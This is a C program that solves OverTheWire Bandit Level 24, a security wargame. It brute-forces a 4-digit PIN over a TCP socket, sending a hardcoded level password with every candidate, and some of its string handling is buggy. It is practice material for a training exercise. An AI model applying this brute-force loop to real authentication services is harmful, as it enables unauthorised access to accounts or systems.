// OverTheWire Bandit Level 24 solution written in C
// 1/10/2021

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main (int argc, char *argv[]){
    
    // socket() returns a file descriptor
    int soc;
    soc = socket(AF_INET, SOCK_STREAM, 0); 

    if (soc == -1){
        printf("Unable to create socket\n");
    }


    // Initialize server information
    struct sockaddr_in server;
    //server.sin_addr.s_addr = inet_addr("localhost");
    server.sin_addr.s_addr = inet_addr("192.168.101.80");
    server.sin_family = AF_INET;
    server.sin_port = htons (30002);

    
    // Connect to server
    if (connect( soc, (struct sockaddr *) &server, sizeof(server)) < 0 ){
        printf("Unable to connect to server\n");
        return -1;
    }

    printf("Connected to server\n");

    char *welcome_msg = (char *) malloc (sizeof(char)*256);
    recv (soc, welcome_msg, 256, 0);
    printf("Welcome message : %s\n", welcome_msg);


    // Create data to send to brute force the 4-digit pin code
    char *msgtemplate = ("UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ");
    int length = strlen(msgtemplate);

    char *message = (char *) malloc(length + 6);
    strcpy(message, msgtemplate);

    *(message+length) = ' ';
    *(message+length+5) = '\n';

    for (int i = 0 ; i < 10000 ; ++i){

        // Create message with the 4-digit pin code
        int a=0, b=0, c=0, d = i%10;

        if (i > 9){
            c = (i/10)%10;

            if (i > 99){
                b = (i/100)%10;

                if (i > 999){
                    a = (i/1000)%10;
                }
            }
        }

        message[length+1] = a + '0';
        message[length+2] = b + '0';
        message[length+3] = c + '0';
        message[length+4] = d + '0';


        // Send message to server
        if ( send(soc, message, strlen(message), 0) < 0 ){
            printf("Message could not be sent\n");
            return -1;
        }



        // Receive data on socket
        char *response = (char *) malloc (sizeof(char)*256);

        if ( recv(soc, response, 256, 0) < 0 ){
           printf("Response could not be received\n");
           return -1;
        }


        // Retrieve pincode from message
        char *pincode = (char *) malloc(sizeof(char)*4);
        strncpy (pincode, message+33, 4);


        // Check if pin code is correct
        if (response[0]=='W' && response[1]=='r' && response[2]=='o' && response[3]=='n' && response[4]=='g'){
            printf("Wrong pin code : %s\n", pincode);
        }

        else {
            printf("Correct! The pin code is %s\n", pincode);
            printf("Response was : %s\n", response);
            return 1;
        }
    }

    return 0;
}
